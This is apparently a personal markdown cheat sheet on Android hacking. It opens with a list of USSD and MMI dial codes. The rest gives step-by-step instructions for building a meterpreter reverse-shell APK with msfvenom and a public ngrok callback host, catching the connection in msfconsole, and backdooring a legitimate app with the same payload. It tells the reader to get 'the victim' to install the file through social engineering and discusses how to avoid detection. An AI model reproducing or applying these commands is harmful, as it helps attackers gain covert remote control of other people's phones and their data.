# android-hacking



# ANDROID TECHNOLOGY

## TERMINOLOGY

- USSD

```bash
# Unstructured Supplementary Service Data)
- Used by GSM,smartphones... Used to communicate with mobile operator network
- Hep to access some phone features
```

- MMI code
```bash
# Man-Machine Interface code,
- A string of numbers or letters that instructs your device to carry out certain tasks
```

- GSM 
```bash
# Global System for Mobile Communications)
```

- IMEI
```bash
# International Mobile Equipment Identity
```

# USSD codes

- [USSD codes](https://www.maketecheasier.com/android-ussd-secret-security-codes/)
- `*#06#` Used to Get IMEI number of your device 
- `*#07#` Check SAR level # Specific absorption rate (`1.6W/kg`)
- `*#*#225#*#*` Display calenda storage data
- `*#*#4636#*#*` View Smartphone Battery, WLAN, and Other Inf
- `*31#` Turn Off Caller ID-- Enable/disable outgoing caller ID
- `*43#` Enable call waiting service. `#43#` To disable
-  `*#67#` Check Call Forwarding
-  `*57` Activate call tracing service
-  `**21*NUMBER#` Call forward code
-  `##002#` Call forward erasal code

- [x] Below codes not yet tested
- `*#*#1472365#*#*` GPS System check (strength and efficiency)
- `*#*#2664#*#*` Touch screen Test
- `#*#232339#*#*` Test Wi-Fi
- `*#*#197328640#*#*` Enable service mode
- `*#*#4986*2650468#*#*` View firmware Information
- ` *#*#34971539#*#*` View Camera Information
-  `*#3282*727336*#` Check Storage and System Details



## Using malicios APK file

1. Getting public ip with ngrok
          
           ./ngrok tcp 1234
           
2. Generating with msfvenom  
         
          msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12126 R > malicious.apk
3. Using msfconsole to listen to the connection from our payload
    
       use exploit/multi/handler
       set payload android/meterpreter/reverse_tcp
   
   Then
   
      `Now we need to send the apk to the victim and getting them to install and launch`
      
 #### Disadvantages of this method
 
  1. Requires either access to the victim’s phone or social engineering to get the victim to install and launch the malicious apk.
  2. The generated apk file does not look legitimate. It’s only a few KBs and doesn’t do anything when clicked on. The victim might either uninstall it right away or not install it at all.
  3. Might require a lot of time and effort to make the apk file look realistic i.e. changing the logo, adding some functionality.
  4. Such an apk file is easily classified as dangerous by any anti-virus installed on the victim’s phone.
  5. Numerous warnings from the mobile device and Google Play Store that installing apps from unknown sources is dangerous. This might deter the victim from proceeding.
  6. The connection we get back is not persistent. Once the phone reboots, loses internet connection, or the user clears all the running apps in the background, we lose our connection and the only way to get it back again is if the user clicks on the app icon again.
  
  ## Injecting a Malicious Payload on a Legitimate Android App
  
   * you can download legitimate apk files. Kindly note that not all apk files can easily be exploited in this way. Some of them have protections in place
    Then 
    
        msfvenom -x CameraSample.apk -p android/meterpreter/reverse_tcp LHOST=2.tcp.ngrok.io LPORT=12492 -o CameraSample_backdoored.apk
    
